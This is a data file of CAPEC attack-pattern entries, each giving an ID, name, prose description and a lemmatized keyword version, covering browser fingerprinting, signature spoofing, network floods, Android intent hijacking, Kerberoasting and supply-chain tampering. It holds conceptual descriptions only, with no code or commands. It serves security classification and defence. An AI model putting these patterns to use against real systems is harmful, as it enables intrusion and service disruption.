CAPEC-472,Browser Fingerprinting,"An attacker carefully crafts small snippets of Java Script to efficiently detect the type of browser the potential victim is using. Many web-based attacks need prior knowledge of the web browser including the version of browser to ensure successful exploitation of a vulnerability. Having this knowledge allows an attacker to target the victim with attacks that specifically exploit known or zero day weaknesses in the type and version of the browser used by the victim. Automating this process via Java Script as a part of the same delivery system used to exploit the browser is considered more efficient as the attacker can supply a browser fingerprinting method and integrate it with exploit code, all contained in Java Script and in response to the same web page request by the browser.",attacker carefully craft small snippet java script efficiently detect type browser potential victim web base attack need prior knowledge web browser include version browser ensure successful exploitation vulnerability have knowledge allow attacker target victim attack specifically exploit known zero day weakness type version browser victim automate process java script delivery system exploit browser consider efficient attacker supply browser fingerprinting method integrate exploit code contain java script response web page request browser
CAPEC-473,Signature Spoof,"An attacker generates a message or datablock that causes the recipient to believe that the message or datablock was generated and cryptographically signed by an authoritative or reputable source, misleading a victim or victim operating system into performing malicious actions.",attacker generate message datablock cause recipient believe message datablock generate cryptographically sign authoritative reputable source mislead victim victim operate system perform malicious action
CAPEC-474,Signature Spoofing by Key Theft,An attacker obtains an authoritative or reputable signer's private signature key by theft and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.,attacker obtain authoritative reputable signer private signature key theft use key forge signature original signer mislead victim perform action benefit attacker
CAPEC-475,Signature Spoofing by Improper Validation,"An adversary exploits a cryptographic weakness in the signature verification algorithm implementation to generate a valid signature without knowing the key.Signature verification algorithms are generally used to determine whether a certificate or piece of code (e.g. executable, binary, etc.) possesses a valid signature and can be trusted.If the leveraged algorithm confirms that a valid signature exists, it establishes a foundation of trust that is further conveyed to the end-user when interacting with a website or application. However, if the signature verification algorithm improperly validates the signature, either by not validating the signature at all or by failing to fully validate the signature, it could result in an adversary generating a spoofed signature and being classified as a legitimate entity. Successfully exploiting such a weakness could further allow the adversary to reroute users to malicious sites, steals files, activates microphones, records keystrokes and passwords, wipes disks, installs malware, and more.",adversary exploit cryptographic weakness signature verification algorithm implementation generate valid signature know key signature verification algorithm generally determine certificate piece code executable binary etc possess valid signature trust leveraged algorithm confirm valid signature exist establish foundation trust convey end user interact website application signature verification algorithm improperly validate signature validate signature fail fully validate signature result adversary generate spoofed signature classify legitimate entity successfully exploit weakness allow adversary reroute user malicious site steal file activate microphone record keystroke password wipe disk install malware
CAPEC-476,Signature Spoofing by Misrepresentation,"An attacker exploits a weakness in the parsing or display code of the recipient software to generate a data blob containing a supposedly valid signature, but the signer's identity is falsely represented, which can lead to the attacker manipulating the recipient software or its victim user to perform compromising actions.",attacker exploit weakness parsing display code recipient software generate data blob contain supposedly valid signature signer identity falsely represent lead attacker manipulate recipient software victim user perform compromising action
CAPEC-477,Signature Spoofing by Mixing Signed and Unsigned Content,"An attacker exploits the underlying complexity of a data structure that allows for both signed and unsigned content, to cause unsigned data to be processed as though it were signed data.",attacker exploit underlie complexity data structure allow sign unsigned content cause unsigned datum process sign datum
CAPEC-478,Modification of Windows Service Configuration,An adversary exploits a weakness in access control to modify the execution parameters of a Windows service. The goal of this attack is to execute a malicious binary in place of an existing service.,adversary exploit weakness access control modify execution parameter windows service goal attack execute malicious binary place exist service
CAPEC-479,Malicious Root Certificate,"An adversary exploits a weakness in authorization and installs a new root certificate on a compromised system. Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.",adversary exploit weakness authorization install new root certificate compromised system certificate commonly establish secure tls ssl communication web browser user attempt browse website present certificate trust error message display warn user security risk depend security setting browser allow user establish connection website adversary technique avoid security warning prompt user compromised system connect https adversary control web server spoof legitimate website order collect login credential
CAPEC-48,Passing Local Filenames to Functions That Expect a URL,"This attack relies on client side code to access local files and resources instead of URLs. When the client browser is expecting a URL string, but instead receives a request for a local file, that execution is likely to occur in the browser process space with the browser's authority to local files. The attacker can send the results of this request to the local files out to a site that they control. This attack may be used to steal sensitive authentication data (either local or remote), or to gain system profile information to launch further attacks.",attack rely client code access local file resource instead url client browser expect url string instead receive request local file execution likely occur browser process space browser authority local file attacker send result request local file site control attack steal sensitive authentication datum local remote gain system profile information launch attack
CAPEC-480,Escaping Virtualization,"An adversary gains access to an application, service, or device with the privileges of an authorized or privileged user by escaping the confines of a virtualized environment. The adversary is then able to access resources or execute unauthorized code within the host environment, generally with the privileges of the user running the virtualized process. Successfully executing an attack of this type is often the first step in executing more complex attacks.",adversary gain access application service device privilege authorized privileged user escape confine virtualized environment adversary able access resource execute unauthorized code host environment generally privilege user run virtualize process successfully execute attack type step execute complex attack
CAPEC-481,Contradictory Destinations in Traffic Routing Schemes,"Adversaries can provide contradictory destinations when sending messages. Traffic is routed in networks using the domain names in various headers available at different levels of the OSI model. In a Content Delivery Network (CDN) multiple domains might be available, and if there are contradictory domain names provided it is possible to route traffic to an inappropriate destination. The technique, called Domain Fronting, involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. An alternative technique, called Domainless Fronting, is similar, but the SNI field is left blank.",adversary provide contradictory destination send message traffic route network domain name header available different level osi model content delivery network cdn multiple domain available contradictory domain name provide possible route traffic inappropriate destination technique call domain fronting involve different domain name sni field tls header host field http header alternative technique call domainless fronting similar sni field leave blank
CAPEC-482,TCP Flood,An adversary may execute a flooding attack using the TCP protocol with the intent to deny legitimate users access to a service. These attacks exploit the weakness within the TCP protocol where there is some state information for the connection the server needs to maintain. This often involves the use of TCP SYN messages.,adversary execute flooding attack tcp protocol intent deny legitimate user access service attack exploit weakness tcp protocol state information connection server need maintain involve use tcp syn message
CAPEC-485,Signature Spoofing by Key Recreation,An attacker obtains an authoritative or reputable signer's private signature key by exploiting a cryptographic weakness in the signature algorithm or pseudorandom number generation and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.,attacker obtain authoritative reputable signer private signature key exploit cryptographic weakness signature algorithm pseudorandom number generation use key forge signature original signer mislead victim perform action benefit attacker
CAPEC-486,UDP Flood,"An adversary may execute a flooding attack using the UDP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. Additionally, firewalls often open a port for each UDP connection destined for a service with an open UDP port, meaning the firewalls in essence save the connection state thus the high packet nature of a UDP flood can also overwhelm resources allocated to the firewall. UDP attacks can also target services like DNS or VoIP which utilize these protocols. Additionally, due to the session-less nature of the UDP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.",adversary execute flooding attack udp protocol intent deny legitimate user access service consume available network bandwidth additionally firewall open port udp connection destine service open udp port mean firewall essence save connection state high packet nature udp flood overwhelm resource allocate firewall udp attack target service like dns voip utilize protocol additionally session nature udp protocol source packet easily spoof make difficult find source attack
CAPEC-487,ICMP Flood,"An adversary may execute a flooding attack using the ICMP protocol with the intent to deny legitimate users access to a service by consuming the available network bandwidth. A typical attack involves a victim server receiving ICMP packets at a high rate from a wide range of source addresses. Additionally, due to the session-less nature of the ICMP protocol, the source of a packet is easily spoofed making it difficult to find the source of the attack.",adversary execute flooding attack icmp protocol intent deny legitimate user access service consume available network bandwidth typical attack involve victim server receive icmp packet high rate wide range source address additionally session nature icmp protocol source packet easily spoof make difficult find source attack
CAPEC-488,HTTP Flood,An adversary may execute a flooding attack using the HTTP protocol with the intent to deny legitimate users access to a service by consuming resources at the application layer such as web services and their infrastructure. These attacks use legitimate session-based HTTP GET requests designed to consume large amounts of a server's resources. Since these are legitimate sessions this attack is very difficult to detect.,adversary execute flooding attack http protocol intent deny legitimate user access service consume resource application layer web service infrastructure attack use legitimate session base http request design consume large amount server resource legitimate session attack difficult detect
CAPEC-489,SSL Flood,"An adversary may execute a flooding attack using the SSL protocol with the intent to deny legitimate users access to a service by consuming all the available resources on the server side. These attacks take advantage of the asymmetric relationship between the processing power used by the client and the processing power used by the server to create a secure connection. In this manner the attacker can make a large number of HTTPS requests on a low provisioned machine to tie up a disproportionately large number of resources on the server. The clients then continue to keep renegotiating the SSL connection. When multiplied by a large number of attacking machines, this attack can result in a crash or loss of service to legitimate users.",adversary execute flooding attack ssl protocol intent deny legitimate user access service consume available resource server attack advantage asymmetric relationship processing power client processing power server create secure connection manner attacker large number https request low provisioned machine tie disproportionately large number resource server client continue renegotiate ssl connection multiply large number attack machine attack result crash loss service legitimate user
CAPEC-49,Password Brute Forcing,"An adversary tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password.A system will be particularly vulnerable to this type of an attack if it does not have a proper enforcement mechanism in place to ensure that passwords selected by users are strong passwords that comply with an adequate password policy. In practice a pure brute force attack on passwords is rarely used, unless the password is suspected to be weak. Other password cracking methods exist that are far more effective (e.g. dictionary attacks, rainbow tables, etc.). Knowing the password policy on the system can make a brute force attack more efficient. For instance, if the policy states that all passwords must be of a certain level, there is no need to check smaller candidates.",adversary try possible value password succeed brute force attack feasible computationally successful essentially possible password give alphabet lower case letter upper case letter number symbol etc maximum length password system particularly vulnerable type attack proper enforcement mechanism place ensure password select user strong password comply adequate password policy practice pure brute force attack password rarely password suspect weak password cracking method exist far effective dictionary attack rainbow table etc know password policy system brute force attack efficient instance policy state password certain level need check small candidate
CAPEC-490,Amplification,"An adversary may execute an amplification where the size of a response is far greater than that of the request that generates it. The goal of this attack is to use a relatively few resources to create a large amount of traffic against a target server. To execute this attack, an adversary send a request to a 3rd party service, spoofing the source address to be that of the target server. The larger response that is generated by the 3rd party service is then sent to the target server. By sending a large number of initial requests, the adversary can generate a tremendous amount of traffic directed at the target. The greater the discrepancy in size between the initial request and the final payload delivered to the target increased the effectiveness of this attack.",adversary execute amplification size response far great request generate goal attack use relatively resource create large traffic target server execute attack adversary send request party service spoof source address target server large response generate party service send target server send large number initial request adversary generate tremendous traffic direct target great discrepancy size initial request final payload deliver target increase effectiveness attack
CAPEC-491,Quadratic Data Expansion,"An adversary exploits macro-like substitution to cause a denial of service situation due to excessive memory being allocated to fully expand the data. The result of this denial of service could cause the application to freeze or crash. This involves defining a very large entity and using it multiple times in a single entity substitution. CAPEC-197 is a similar attack pattern, but it is easier to discover and defend against. This attack pattern does not perform multi-level substitution and therefore does not obviously appear to consume extensive resources.",adversary exploit macro like substitution cause denial service situation excessive memory allocate fully expand datum result denial service cause application freeze crash involve define large entity multiple time single entity substitution similar attack pattern easy discover defend attack pattern perform multi level substitution obviously appear consume extensive resource
CAPEC-492,Regular Expression Exponential Blowup,An adversary may execute an attack on a program that uses a poor Regular Expression(Regex) implementation by choosing input that results in an extreme situation for the Regex. A typical extreme situation operates at exponential time compared to the input size. This is due to most implementations using a Nondeterministic Finite Automaton(NFA) state machine to be built by the Regex algorithm since NFA allows backtracking and thus more complex regular expressions.The algorithm builds a finite state machine and based on the input transitions through all the states until the end of the input is reached. NFA engines may evaluate each character in the input string multiple times during the backtracking. The algorithm tries each path through the NFA one by one until a match is found; the malicious input is crafted so every path is tried which results in a failure. Exploitation of the Regex results in programs hanging or taking a very long time to complete. These attacks may target various layers of the Internet due to regular expressions being used in validation.,adversary execute attack program use poor regular implementation choose input result extreme situation regex typical extreme situation operate exponential time compare input size implementation nondeterministic finite state machine build regex algorithm nfa allow backtracking complex regular expression algorithm build finite state machine base input transition state end input reach nfa engine evaluate character input string multiple time backtracking algorithm try path nfa match find malicious input craft path try result failure exploitation regex result program hang take long time complete attack target layer internet regular expression validation
CAPEC-493,SOAP Array Blowup,"An adversary may execute an attack on a web service that uses SOAP messages in communication. By sending a very large SOAP array declaration to the web service, the attacker forces the web service to allocate space for the array elements before they are parsed by the XML parser. The attacker message is typically small in size containing a large array declaration of say 1,000,000 elements and a couple of array elements. This attack targets exhaustion of the memory resources of the web service.",adversary execute attack web service use soap message communication send large soap array declaration web service attacker force web service allocate space array element parse xml parser attacker message typically small size contain large array declaration element couple array element attack target exhaustion memory resource web service
CAPEC-494,TCP Fragmentation,"An adversary may execute a TCP Fragmentation attack against a target with the intention of avoiding filtering rules of network controls, by attempting to fragment the TCP packet such that the headers flag field is pushed into the second fragment which typically is not filtered.In comparison, IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. This behavior of fragmentation defeats some IPS and firewall filters who typically check the FLAGS in the header of the first packet since dropping this packet prevents the following fragments from being processed and assembled.Another variation is overlapping fragments thus that an innocuous first segment passes the filter and the second segment overwrites the TCP header data with the true payload which is malicious in nature. The malicious payload manipulated properly may lead to a DoS due to resource consumption or kernel crash. Additionally the fragmentation could be used in conjunction with sending fragments at a rate slightly slower than the timeout to cause a DoS condition by forcing resources that assemble the packet to wait an inordinate amount of time to complete the task. The fragmentation identification numbers could also be duplicated very easily as there are only 16 bits in IPv4 so only 65536 packets are needed.",adversary execute tcp fragmentation attack target intention avoid filtering rule network control attempt fragment tcp packet header flag field push second fragment typically filter comparison ip fragmentation occur ip datagram large mtu route datagram traverse behavior fragmentation defeat ips firewall filter typically check flag header packet drop packet prevent follow fragment process assemble variation overlap fragment innocuous segment pass filter second segment overwrite tcp header datum true payload malicious nature malicious payload manipulate properly lead dos resource consumption kernel crash additionally fragmentation conjunction send fragment rate slightly slow timeout cause dos condition force resource assemble packet wait inordinate time complete task fragmentation identification number duplicate easily bit packet need
CAPEC-495,UDP Fragmentation,An attacker may execute a UDP Fragmentation attack against a target server in an attempt to consume resources such as bandwidth and CPU. IP fragmentation occurs when an IP datagram is larger than the MTU of the route the datagram has to traverse. Typically the attacker will use large UDP packets over 1500 bytes of data which forces fragmentation as ethernet MTU is 1500 bytes. This attack is a variation on a typical UDP flood but it enables more network bandwidth to be consumed with fewer packets. Additionally it has the potential to consume server CPU resources and fill memory buffers associated with the processing and reassembling of fragmented packets.,attacker execute udp fragmentation attack target server attempt consume resource bandwidth cpu ip fragmentation occur ip datagram large mtu route datagram traverse typically attacker use large udp packet byte datum force fragmentation ethernet mtu byte attack variation typical udp flood enable network bandwidth consume few packet additionally potential consume server cpu resource fill memory buffer associate processing reassembling fragment packet
CAPEC-496,ICMP Fragmentation,An attacker may execute a ICMP Fragmentation attack against a target with the intention of consuming resources or causing a crash. The attacker crafts a large number of identical fragmented IP packets containing a portion of a fragmented ICMP message. The attacker these sends these messages to a target host which causes the host to become non-responsive. Another vector may be sending a fragmented ICMP message to a target host with incorrect sizes in the header which causes the host to hang.,attacker execute icmp fragmentation attack target intention consume resource cause crash attacker craft large number identical fragmented ip packet contain portion fragmented icmp message attacker send message target host cause host non responsive vector send fragmented icmp message target host incorrect size header cause host hang
CAPEC-497,File Discovery,"An adversary engages in probing and exploration activities to determine if common key files exists. Such files often contain configuration and security parameters of the targeted application, system or network. Using this knowledge may often pave the way for more damaging attacks.",adversary engage probing exploration activity determine common key file exist file contain configuration security parameter target application system network knowledge pave way damaging attack
CAPEC-498,Probe iOS Screenshots,"An adversary examines screenshot images created by iOS in an attempt to obtain sensitive information. This attack targets temporary screenshots created by the underlying OS while the application remains open in the background.These images are used by iOS to aid in the visual transition between open applications and improve the user's experience with a device. An application can be at risk even if it properly protects sensitive information when at rest. If the application displays sensitive information on the screen, then the potential exists for iOS to unintentionally record that information in an image file. An adversary can retrieve these images either by gaining access to the image files, or by physically obtaining the device and leveraging the multitasking switcher interface. This attack differs from CAPEC-648, which targets intentional screenshots initiated by an end-user that are stored in the device's storage.",adversary examine screenshot image create ios attempt obtain sensitive information attack target temporary screenshot create underlie os application remain open background image ios aid visual transition open application improve user experience device application risk properly protect sensitive information rest application display sensitive information screen potential exist ios unintentionally record information image file adversary retrieve image gain access image file physically obtain device leverage multitasking switcher interface attack differ target intentional screenshot initiate end user store device storage
CAPEC-499,Android Intent Intercept,"An adversary, through a previously installed malicious application, intercepts messages from a trusted Android-based application in an attempt to achieve a variety of different objectives including denial of service, information disclosure, and data injection. An implicit intent sent from a trusted application can be received by any application that has declared an appropriate intent filter. If the intent is not protected by a permission that the malicious application lacks, then the attacker can gain access to the data contained within the intent. Further, the intent can be either blocked from reaching the intended destination, or modified and potentially forwarded along.",adversary previously instal malicious application intercept message trusted android base application attempt achieve variety different objective include denial service information disclosure datum injection implicit intent send trusted application receive application declare appropriate intent filter intent protect permission malicious application lack attacker gain access datum contain intent intent block reach intended destination modify potentially forward
CAPEC-5,Blue Boxing,"This type of attack against older telephone switches and trunks has been around for decades. A tone is sent by an adversary to impersonate a supervisor signal which has the effect of rerouting or usurping command of the line. While the US infrastructure proper may not contain widespread vulnerabilities to this type of attack, many companies are connected globally through call centers and business process outsourcing. These international systems may be operated in countries which have not upgraded Telco infrastructure and so are vulnerable to Blue boxing. Blue boxing is a result of failure on the part of the system to enforce strong authorization for administrative functions. While the infrastructure is different than standard current applications like web applications, there are historical lessons to be learned to upgrade the access control for administrative functions.This attack pattern is included in CAPEC for historical purposes.",type attack old telephone switch trunk decade tone send adversary impersonate supervisor signal effect reroute usurp command line infrastructure proper contain widespread vulnerability type attack company connect globally center business process outsourcing international system operate country upgrade telco infrastructure vulnerable blue boxing blue boxing result failure system enforce strong authorization administrative function infrastructure different standard current application like web application historical lesson learn upgrade access control administrative function attack pattern include capec historical purpose
CAPEC-50,Password Recovery Exploitation,"An attacker may take advantage of the application feature to help users recover their forgotten passwords in order to gain access into the system with the same privileges as the original user. Generally password recovery schemes tend to be weak and insecure.Most of them use only one security question. For instance, mother's maiden name tends to be a fairly popular one. Unfortunately in many cases this information is not very hard to find, especially if the attacker knows the legitimate user. These generic security questions are also re-used across many applications, thus making them even more insecure. An attacker could for instance overhear a coworker talking to a bank representative at the work place and supplying their mother's maiden name for verification purposes. An attacker can then try to log in into one of the victim's accounts, click on ""forgot password"" and there is a good chance that the security question there will be to provide mother's maiden name. A weak password recovery scheme totally undermines the effectiveness of a strong password scheme.",attacker advantage application feature help user recover forget password order gain access system privilege original user generally password recovery scheme tend weak insecure use security question instance mother maiden tend fairly popular unfortunately case information hard find especially attacker know legitimate user generic security question application make insecure attacker instance overhear coworker talk bank representative work place supply mother maiden verification purpose attacker try log victim account click forget password good chance security question provide mother maiden weak password recovery scheme totally undermine effectiveness strong password scheme
CAPEC-500,WebView Injection,"An adversary, through a previously installed malicious application, injects code into the context of a web page displayed by a WebView component. Through the injected code, an adversary is able to manipulate the DOM tree and cookies of the page, expose sensitive information, and can launch attacks against the web application from within the web page.",adversary previously instal malicious application inject code context web page display webview component inject code adversary able manipulate dom tree cookie page expose sensitive information launch attack web application web page
CAPEC-501,Android Activity Hijack,An adversary intercepts an implicit intent sent to launch a Android-based trusted activity and instead launches a counterfeit activity in its place. The malicious activity is then used to mimic the trusted activity's user interface and prompt the target to enter sensitive data as if they were interacting with the trusted activity.,adversary intercept implicit intent send launch android base trust activity instead launch counterfeit activity place malicious activity mimic trust activity user interface prompt target enter sensitive datum interact trust activity
CAPEC-502,Intent Spoof,"An adversary, through a previously installed malicious application, issues an intent directed toward a specific trusted application's component in an attempt to achieve a variety of different objectives including modification of data, information disclosure, and data injection. Components that have been unintentionally exported and made public are subject to this type of an attack. If the component trusts the intent's action without verififcation, then the target application performs the functionality at the adversary's request, helping the adversary achieve the desired negative technical impact.",adversary previously instal malicious application issue intent direct specific trust application component attempt achieve variety different objective include modification datum information disclosure datum injection component unintentionally export public subject type attack component trust intent action verififcation target application perform functionality adversary request help adversary achieve desire negative technical impact
CAPEC-503,WebView Exposure,"An adversary, through a malicious web page, accesses application specific functionality by leveraging interfaces registered through WebView's addJavascriptInterface API. Once an interface is registered to WebView through addJavascriptInterface, it becomes global and all pages loaded in the WebView can call this interface.",adversary malicious web page access application specific functionality leverage interface register webview addjavascriptinterface api interface register webview addjavascriptinterface global page load webview interface
CAPEC-504,Task Impersonation,"An adversary, through a previously installed malicious application, impersonates an expected or routine task in an attempt to steal sensitive information or leverage a user's privileges.When impersonating an expected task, the adversary monitors the task list maintained by the operating system and waits for a specific legitimate task to become active. Once the task is detected, the malicious application launches a new task in the foreground that mimics the user interface of the legitimate task. At this point, the user thinks that they are interacting with the legitimate task that they started, but instead they are interacting with the malicious application. Once the adversary's goal is reached, the malicious application can exit, leaving the original trusted application visible and the appearance that nothing out of the ordinary has occurred.A second approach entails the adversary impersonating an unexpected task, but one that may often be spawned by legitimate background processes. For example, an adversary may randomly impersonate a system credential prompt, implying that a background process requires authentication for some purpose. The user, believing they are interacting with a legitimate task, enters their credentials or authorizes the use of their stored credentials, which the adversary then leverages for nefarious purposes. This type of attack is most often used to obtain sensitive information (e.g., credentials) from the user, but may also be used to ride the user's privileges.",adversary previously instal malicious application impersonate expected routine task attempt steal sensitive information leverage user privilege impersonate expect task adversary monitor task list maintain operate system wait specific legitimate task active task detect malicious application launch new task foreground mimic user interface legitimate task point user think interact legitimate task start instead interact malicious application adversary goal reach malicious application exit leave original trusted application visible appearance ordinary occur second approach entail adversary impersonate unexpected task spawn legitimate background process example adversary randomly impersonate system credential prompt imply background process require authentication purpose user believe interact legitimate task enter credential authorize use store credential adversary leverage nefarious purpose type attack obtain sensitive information credential user ride user privilege
CAPEC-505,Scheme Squatting,"An adversary, through a previously installed malicious application, registers for a URL scheme intended for a target application that has not been installed. Thereafter, messages intended for the target application are handled by the malicious application. Upon receiving a message, the malicious application displays a screen that mimics the target application, thereby convincing the user to enter sensitive information. This type of attack is most often used to obtain sensitive information (e.g., credentials) from the user as they think that they are interacting with the intended target application.",adversary previously instal malicious application register url scheme intend target application instal message intend target application handle malicious application receive message malicious application display screen mimic target application convince user enter sensitive information type attack obtain sensitive information credential user think interact intend target application
CAPEC-506,Tapjacking,"An adversary, through a previously installed malicious application, displays an interface that misleads the user and convinces them to tap on an attacker desired location on the screen. This is often accomplished by overlaying one screen on top of another while giving the appearance of a single interface. There are two main techniques used to accomplish this. The first is to leverage transparent properties that allow taps on the screen to pass through the visible application to an application running in the background. The second is to strategically place a small object (e.g., a button or text field) on top of the visible screen and make it appear to be a part of the underlying application. In both cases, the user is convinced to tap on the screen but does not realize the application that they are interacting with.",adversary previously instal malicious application display interface mislead user convince tap attacker desire location screen accomplish overlay screen give appearance single interface main technique accomplish leverage transparent property allow tap screen pass visible application application run background second strategically place small object button text field visible screen appear underlying application case user convince tap screen realize application interact
CAPEC-507,Physical Theft,An adversary gains physical access to a system or device through theft of the item. Possession of a system or device enables a number of unique attacks to be executed and often provides the adversary with an extended timeframe for which to perform an attack. Most protections put in place to secure sensitive information can be defeated when an adversary has physical access and enough time.,adversary gain physical access system device theft item possession system device enable number unique attack execute provide adversary extended timeframe perform attack protection place secure sensitive information defeat adversary physical access time
CAPEC-508,Shoulder Surfing,"In a shoulder surfing attack, an adversary observes an unaware individual's keystrokes, screen content, or conversations with the goal of obtaining sensitive information. One motive for this attack is to obtain sensitive information about the target for financial, personal, political, or other gains. From an insider threat perspective, an additional motive could be to obtain system/application credentials or cryptographic keys. Shoulder surfing attacks are accomplished by observing the content ""over the victim's shoulder"", as implied by the name of this attack.",shoulder surfing attack adversary observe unaware individual keystroke screen content conversation goal obtain sensitive information motive attack obtain sensitive information target financial personal political gain insider threat perspective additional motive obtain system application credential cryptographic key shoulder surfing attack accomplish observe content victim shoulder imply attack
CAPEC-509,Kerberoasting,"Through the exploitation of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs), the adversary obtains and subsequently cracks the hashed credentials of a service account target to exploit its privileges. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. As an authenticated user, the adversary may request Active Directory and obtain a service ticket with portions encrypted via RC4 with the private key of the authenticated account. By extracting the local ticket and saving it disk, the adversary can brute force the hashed value to reveal the target account credentials.",exploitation service account leverage kerberos authentication service principal names spns adversary obtain subsequently crack hashed credential service account target exploit privilege kerberos authentication protocol center ticketing system request grant access service access request service authenticate user adversary request active directory obtain service ticket portion encrypt private key authenticate account extract local ticket save disk adversary brute force hashed value reveal target account credential
CAPEC-51,Poison Web Service Registry,"SOA and Web Services often use a registry to perform look up, get schema information, and metadata about services. A poisoned registry can redirect (think phishing for servers) the service requester to a malicious service provider, provide incorrect information in schema or metadata, and delete information about service provider interfaces.WS-Addressing is used to virtualize services, provide return addresses and other routing information, however, unless the WS-Addressing headers are protected they are vulnerable to rewriting. Content in a registry is deployed by the service provider. The registry in an SOA or Web Services system can be accessed by the service requester via UDDI or other protocol.",soa web services use registry perform look schema information metadata service poison registry redirect think phishing server service requester malicious service provider provide incorrect information schema metadata delete information service provider interface ws addressing virtualize service provide return address routing information ws addressing header protect vulnerable rewrite content registry deploy service provider registry soa web services system access service requester uddi protocol
CAPEC-510,SaaS User Request Forgery,"An adversary, through a previously installed malicious application, performs malicious actions against a third-party Software as a Service (SaaS) application (also known as a cloud based application) by leveraging the persistent and implicit trust placed on a trusted user's session. This attack is executed after a trusted user is authenticated into a cloud service, ""piggy-backing"" on the authenticated session, and exploiting the fact that the cloud service believes it is only interacting with the trusted user. If successful, the actions embedded in the malicious application will be processed and accepted by the targeted SaaS application and executed at the trusted user's privilege level.",adversary previously instal malicious application perform malicious action party software service saas application know cloud base application leverage persistent implicit trust place trust user session attack execute trusted user authenticate cloud service piggy back authenticate session exploit fact cloud service believe interact trust user successful action embed malicious application process accept target saas application execute trusted user privilege level
CAPEC-511,Infiltration of Software Development Environment,"An attacker uses common delivery mechanisms such as email attachments or removable media to infiltrate the IDE (Integrated Development Environment) of a victim manufacturer with the intent of implanting malware allowing for attack control of the victim IDE environment. The attack then uses this access to exfiltrate sensitive data or information, manipulate said data or information, and conceal these actions. This will allow and aid the attack to meet the goal of future compromise of a recipient of the victim's manufactured product further down in the supply chain.",attacker use common delivery mechanism email attachment removable medium infiltrate ide integrated development environment victim manufacturer intent implant malware allow attack control victim ide environment attack use access exfiltrate sensitive datum information manipulate say datum information conceal action allow aid attack meet goal future compromise recipient victim manufacture product supply chain
CAPEC-516,Hardware Component Substitution During Baselining,"An adversary with access to system components during allocated baseline development can substitute a maliciously altered hardware component for a baseline component during the product development and research phases. This can lead to adjustments and calibrations being made in the product so that when the final product, now containing the modified component, is deployed it will not perform as designed and be advantageous to the adversary.",adversary access system component allocate baseline development substitute maliciously alter hardware component baseline component product development research phase lead adjustment calibration product final product contain modify component deploy perform design advantageous adversary
CAPEC-517,Documentation Alteration to Circumvent Dial-down,"An attacker with access to a manufacturer's documentation, which include descriptions of advanced technology and/or specific components' criticality, alters the documents to circumvent dial-down functionality requirements. This alteration would change the interpretation of implementation and manufacturing techniques, allowing for advanced technologies to remain in place even though these technologies might be restricted to certain customers, such as nations on the terrorist watch list, giving the attacker on the receiving end of a shipped product access to an advanced technology that might otherwise be restricted.",attacker access manufacturer documentation include description advanced technology specific component criticality alter document circumvent dial functionality requirement alteration change interpretation implementation manufacturing technique allow advanced technology remain place technology restrict certain customer nation terrorist watch list give attacker receive end ship product access advanced technology restrict
CAPEC-518,Documentation Alteration to Produce Under-performing Systems,"An attacker with access to a manufacturer's documentation alters the descriptions of system capabilities with the intent of causing errors in derived system requirements, impacting the overall effectiveness and capability of the system, allowing an attacker to take advantage of the introduced system capability flaw once the system is deployed.",attacker access manufacturer documentation alter description system capability intent cause error derive system requirement impact overall effectiveness capability system allow attacker advantage introduce system capability flaw system deploy
CAPEC-519,Documentation Alteration to Cause Errors in System Design,An attacker with access to a manufacturer's documentation containing requirements allocation and software design processes maliciously alters the documentation in order to cause errors in system design. This allows the attacker to take advantage of a weakness in a deployed system of the manufacturer for malicious purposes.,attacker access manufacturer documentation contain requirement allocation software design process maliciously alter documentation order cause error system design allow attacker advantage weakness deploy system manufacturer malicious purpose
CAPEC-52,Embedding NULL Bytes,An adversary embeds one or more null bytes in input to the target software. This attack relies on the usage of a null-valued byte as a string terminator in many environments. The goal is for certain components of the target software to stop processing the input when it encounters the null byte(s).,adversary embed null byte input target software attack rely usage null valued byte string terminator environment goal certain component target software stop process input encounter null
CAPEC-520,Counterfeit Hardware Component Inserted During Product Assembly,An adversary with either direct access to the product assembly process or to the supply of subcomponents used in the product assembly process introduces counterfeit hardware components into product assembly. The assembly containing the counterfeit components results in a system specifically designed for malicious purposes.,adversary direct access product assembly process supply subcomponent product assembly process introduce counterfeit hardware component product assembly assembly contain counterfeit component result system specifically design malicious purpose
CAPEC-521,Hardware Design Specifications Are Altered,"An attacker with access to a manufacturer's hardware manufacturing process documentation alters the design specifications, which introduces flaws advantageous to the attacker once the system is deployed.",attacker access manufacturer hardware manufacturing process documentation alter design specification introduce flaw advantageous attacker system deploy
CAPEC-522,Malicious Hardware Component Replacement,"An adversary replaces legitimate hardware in the system with faulty counterfeit or tampered hardware in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.",adversary replace legitimate hardware system faulty counterfeit tamper hardware supply chain distribution channel purpose cause malicious disruption allow additional compromise system deploy
CAPEC-523,Malicious Software Implanted,"An attacker implants malicious software into the system in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.",attacker implant malicious software system supply chain distribution channel purpose cause malicious disruption allow additional compromise system deploy
CAPEC-524,Rogue Integration Procedures,An attacker alters or establishes rogue processes in an integration facility in order to insert maliciously altered components into the system. The attacker would then supply the malicious components. This would allow for malicious disruption or additional compromise when the system is deployed.,attacker alter establish rogue process integration facility order insert maliciously alter component system attacker supply malicious component allow malicious disruption additional compromise system deploy
